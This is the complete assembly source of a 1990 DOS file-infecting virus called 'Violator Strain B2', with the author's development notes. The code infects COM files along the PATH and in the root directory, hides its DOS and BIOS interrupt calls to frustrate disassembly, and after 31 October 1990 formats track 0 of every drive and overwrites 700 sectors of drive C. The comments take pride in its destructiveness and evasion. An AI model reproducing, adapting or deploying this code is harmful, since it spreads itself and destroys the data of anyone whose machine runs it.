;*****************************************************************************
;
;		                Violator - Strain B2
;
;*****************************************************************************
;
; (Sep/23/90)
;
; Development Notes:
;
; In this version, I have implemented various methods of thwarting users
; attempts to dissassemble this program as well as tracing various interrupt
; calls.
;
; This was done by setting a marker and then doing a CALL to a location which
; will decide which interrupt to issue based on the marker value. Couple this
; with multiple jumps, and it is enough to make any dissassembler puke it's
; guts out, not to mention anyone looking at us with debug will probably
; have an enema before they find out which interrupt we are using.
;
; Also, I have added a routine to thouroughly mess up drive C at the end of
; wiping out all drive. This was taken from Violator A becuase it worked to
; nicely destruction-wise.
;
; In other notes, this sucker is set to go off on October 31st 1990.
;
; UIV v1.0 is still on the fritz and will not become Violator C until I fix it
; to wipe out vectors 13, 26, and 21 (HEX).
;
; (Oct.02.90)
;
; Made a minor change so that INT 26 will also be accessed via flag.
;
;*****************************************************************************
;
;		 	   Written by - The High Evolutionary - 
;				  RABID Head Programmer
;
;		  Copyright (C) 199O by RABID Nat'nl Development Corp.
;
;*****************************************************************************

MOV_CX  MACRO   X
        DB      0B9H				
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H				; Set ORG to 100H plus our own
						
VCODE:  JMP     virus

	NOP
	NOP
	NOP 					;15 NOP's to place JMP Header
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	
v_start equ     $


virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       
        CLD                             
        MOV     SI,DX                   
        ADD     SI,first_3              
	MOV	CX,3
        MOV     DI,OFFSET 100H          
        REPZ    MOVSB                   
        MOV     SI,DX                   
	MOV     AH,30H
	MOV	marker,1
	call	weed	
	CMP	AL,0				;Quit it it's DOS 1.0
	JNZ	dos_ok
        JMP     quit                 

dos_ok: PUSH    ES
        MOV     AH,2FH
        MOV	marker,1
	CALL	weed
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         
        POP     ES
        MOV     DX,dta                  
        ADD     DX,SI                    
        MOV     AH,1AH
        MOV	marker,1
	CALL	weed                     
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    
	JMP	year_check

;
; This routine weed's out the calls...
;

weed:	CMP	marker,1		;Check to see if it's an INT 21 call
	JE      int_21         		;If yes,then go and issue an INT 21
	CMP	marker,2		;Check to see if it's an INT 13 call
	JE	int_13			;If yes, then go and issue an INT 13
	CMP	marker,3		;Check to see if it's an INT 26 call
	JE 	int_26			;If yes, then go and issue an INT 26
	RET				;Go back to where we were called from
	
;
; The RET there is unnecessary, but I put it there just to be on the safe side
; incase of a "What If?" scenario... The real valid RET is issued from the JE
; locations (int_21 and int_13)... You may choose to comment this line on
; compilation, but what difference does one byte make ?
;

year_check:
	MOV	AH,2AH			;Get date info
	MOV	marker,1		;Call DOS
	CALL	weed
	CMP	CX,1990			;Check to see if the year is 1990
	JGE	month_check		;If greater or equal, check month
	JMP	find_path		;If not, go on with infection
	
month_check:
	MOV	AH,2AH			;Get date info
	MOV	marker,1		;Call DOS
	CALL	weed
	CMP	DH,10			;Check to see if it is October
	JGE	day_check		;If greater or equal, check day
	JMP	find_path		;if not, go on with infection

day_check:
	MOV	AH,2Ah			;Get date info
	MOV	marker,1		;Call DOS
	CALL	weed
	CMP	DL,31			;Check to see if it is the 31st
	JGE 	multiplex		;If yes, then nuke drives A:-Z:
	JMP	find_path		;If not, then go on with infection

int_21:	INT	21h			;Issue an INT 21
	RET				;Return from CALL

multiplex:
	MOV	AL,cntr			;Counter is the drive to kill
	CALL	alter    		;Go and kill the drive
                                        ;25 is drive Z:
	CMP	cntr,25			;Is (cntr) 25 ?
	JE	really_nuke		;Now go and Blow up drive C:
	INC	cntr			;Add one to (cntr)
	LOOP	multiplex		;Loop back up to kill next drive

int_26:	INT	26h
	RET

alter:
	MOV	AH,05			;Format Track
	MOV	CH,0			;Format track 0
	MOV	DH,0			;Head 0
	MOV	DL,cntr			;Format for drive in (cntr)
	MOV	marker,2		;Call RWTS
	CALL	weed
	RET				;Return up for next drive

int_13: INT	13h			;Issue an INT 13
	RET				;Return from CALL
					  
really_nuke:
	MOV	AL,2			;Set to fry drive C
	MOV	CX,700			;Set to write 700 sectors
	MOV	DX,00			;Starting at sector 0
	MOV	DS,[DI+99]		;Put random crap in DS
	MOV	BX,[DI+55]		;More crap in BX
	MOV	marker,3		;Call BIOS
	CALL 	weed
	POPF				;Pop the flags because INT 26 messes
					;them up
	
find_path:
        POP     SI			
        PUSH    SI                                   	
        ADD     SI,env_str              
        LODSB				
        MOV     CX,OFFSET 8000H         
        REPNZ   SCASB                   
        MOV     CX,4			                                    

check_next_4:
        LODSB
        SCASB
;
; The JNZ line specifies that if there is no PATH present, then we will go
; along and infect the ROOT directory on the default drive.
;
        JNZ     find_path               ;If not path, then go to ROOT dir    
        LOOP    check_next_4            ;Go back and check for more chars
        POP     SI			;Load in PATH again to look for chars
        POP     ES
        MOV     [SI+path_ad],DI         
        MOV     DI,SI			
        ADD     DI,wrk_spc              ;Put the filename in wrk_spc
        MOV     BX,SI                   
        ADD     SI,wrk_spc              
        MOV     DI,SI                   
        JMP     SHORT   slash_ok

;*****************************************************************************
;
; Infection Notes: (Oct.02.90)
;
; A wierd thing happened a few days ago, I was testing this virus out on my
; system under Flushot + and I monitored everything that was going on. Here is
; the exact order that Violator infects stuff:
;
; 1) If there is a path used, we first infect the current directory until
;    full.
;
;    If there is no path, we infect the current directory either way...
;
; 2) If there is no path, we then infect the current directory, and then
;    go on and infect all COM'z in the root directory.
;
; 3) Finally, after everything in the path has been infected, we then go and
;    infect all of the COM shit in the root directory...
;
;    This results in a bug with the slash checker. It checks to see if there is
;    a slash on the end of the path, and if there is none, it adds one. But
;    what would happen if there's no path??? It'll still add a slash. 
;    This benefit's us greatly. Anyway, on with the code...
;
;*****************************************************************************

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 
        JNZ     found_subdir            
        JMP     all_done                


found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      
        ADD     DI,wrk_spc              ;DI is the file name to infect! (hehe)


move_subdir:
        LODSB                           ;To tedious work to move into subdir
        CMP     AL,';'                  ;Does it end with a ; charachter?
        JZ      moved_one               ;if yes, then we found a subdir 
        CMP     AL,0                    ;is it the end of the path?
        JZ      moved_last_one          ;if yes, then we save the PATH
        STOSB                           ;marker into DI for future reference
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;BX is where the virus data is
        POP     DS                      ;Restore DS so that we can do stuph
        MOV     [BX+path_ad],SI         ;Where is the next subdir?
        NOP
        CMP     CH,'\'                  ;Check to see if it ends in \
        JZ      slash_ok                ;If yes, then it's OK
        MOV     AL,'\'                  ;if not, then add one...
        STOSB				;store the sucker


slash_ok:
        MOV     [BX+nam_ptr],DI         ;Move the filename into workspace
        MOV     SI,BX                   ;Restore the original SI value
        ADD     SI,f_spec               ;Point to COM file victim
        MOV     CX,6
        REPZ    MOVSB                   ;Move victim into workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX is ... THE VICTIM!!!          
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        MOV	marker,1
	CALL	weed
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
        MOV	marker,1
	CALL	weed

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1EH                  ;Mask to remove all but seconds
        CMP     AL,1EH                  ;60 seconds 
        JZ      find_next               
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         
        PUSH    SI                      
        ADD     SI,dta_nam              

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              
        ADD     DX,SI
	MOV	marker,1
	CALL	weed
        MOV     [SI+old_att],CX         
        MOV     AX,OFFSET 4301H         
        AND     CX,OFFSET 0FFFEH        
        MOV     DX,wrk_spc              
        ADD     DX,SI                   
	MOV	marker,1
	CALL	weed
        MOV     AX,OFFSET 3D02H         
        MOV     DX,wrk_spc              
        ADD     DX,SI                   
        MOV	marker,1
	CALL	weed
        JNB     opened_ok               
        JMP     fix_attr                

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        MOV	marker,1
	CALL	weed
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        MOV	marker,1
	CALL	weed
        AND     DH,7                    
        JMP     infect

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
        MOV	marker,1
	CALL	weed		         ;Save first 3 bytes into the data area
        JB      fix_time_stamp  
        CMP     AX,3            
        JNZ     fix_time_stamp  
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        MOV	marker,1
	CALL	weed
        JB      fix_time_stamp  
        MOV     CX,AX           
        SUB     AX,3            
        MOV     [SI+jmp_dsp],AX 
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           
        SUB     DI,OFFSET c_len_x
                                
        MOV     [DI],CX         
        MOV     AH,40H
        MOV_CX  virlen                  
        MOV     DX,SI
        SUB     DX,OFFSET codelen       
        MOV	marker,1
	CALL	weed
        JB      fix_time_stamp          
        CMP     AX,OFFSET virlen        
        JNZ     fix_time_stamp          
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        MOV	marker,1
	CALL	weed
        JB      fix_time_stamp          
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   
        ADD     DX,jmp_op               
        MOV	marker,1
	CALL	weed

fix_time_stamp:
        MOV     DX,[SI+ol_date]         
        MOV     CX,[SI+old_tim]         
        AND     CX,OFFSET 0FFE0H
        OR      CX,1EH                  
        MOV     AX,OFFSET 5701H
        MOV	marker,1
	CALL	weed
        MOV     AH,3EH
        MOV	marker,1
	CALL	weed

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         
        MOV     DX,wrk_spc
        ADD     DX,SI                   
        MOV	marker,1
	CALL	weed

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        MOV	marker,1
	CALL	weed
	POP     DS

quit:
        POP     CX
        XOR     AX,AX			;XOR values so that we will give the
        XOR     BX,BX			;poor sucker a hard time trying to
        XOR     DX,DX			;reassemble the source code if he
        XOR     SI,SI			;decides to dissassemble us.
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH			;Return back to the beginning
					;of the program
;
; It seems as if there is a bit of a misunderstanding about the above line.
; What it simply does is returns from the JMP that we issued at the beginning
; of the program. Heceforth, an infected program will have something to the
; effect of 2145:0100 JMP 104B and the program will then jump to the 
; beginning of us. Then we go along our merry way of infecting files until
; we are done and then come up to the RET 0FFFFH line. This is just like a 
; plain RET put as we all know, you can't RET from a JMP, so this line kinda
; tricks DOS to return back to the line after the one that issued the original
; JMP, thus, it returns to line 2145:0102 and begins with the real program...
;
; Clear? Good...

vir_dat EQU     $

;
; Change the next line on release of compiled file...
;
intro	db	'Violator B2 (C) ''9O RABID Nat''nl Development Corp.',13,10
olddta_ DW      0                       
olddts_ DW      0                       
oldtim_ DW      0                       
count_	DW	0
cntr 	DB 	2				; Drive to nuke from (C:+++)
marker	DB	0				; This is used for INT purposes
oldate_ DW      0                       
oldatt_ DW      0                       
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    
jmpdsp_ DW      0                       
fspec_  DB      '*.COM',0
pathad_ DW      0                       
namptr_ DW      0                       
envstr_ DB      'PATH='                 
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             
dtatim_ DW      0,0                     
dtalen_ DW      0,0                     
dtanam_ DB      0Dh dup (0)             
lst_byt EQU     $                       
virlen  =       lst_byt - v_start       
codelen =       vir_dat - v_start       
c_len_x =       vir_dat - v_start - 2   
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat       
old_dts =       olddts_ - vir_dat       
old_tim =       oldtim_ - vir_dat       
ol_date =       oldate_ - vir_dat       
old_att =       oldatt_ - vir_dat       
first_3 =       first3_ - vir_dat       
jmp_op  =       jmpop_  - vir_dat       
jmp_dsp =       jmpdsp_ - vir_dat       
f_spec  =       fspec_  - vir_dat       
path_ad =       pathad_ - vir_dat       
nam_ptr =       namptr_ - vir_dat       
env_str =       envstr_ - vir_dat       
wrk_spc =       wrkspc_ - vir_dat       
dta     =       dta_    - vir_dat       
dta_tim =       dtatim_ - vir_dat       
dta_len =       dtalen_ - vir_dat       
dta_nam =       dtanam_ - vir_dat       
count 	=	count_  - vir_dat

        CODE    ENDS
END     VCODE

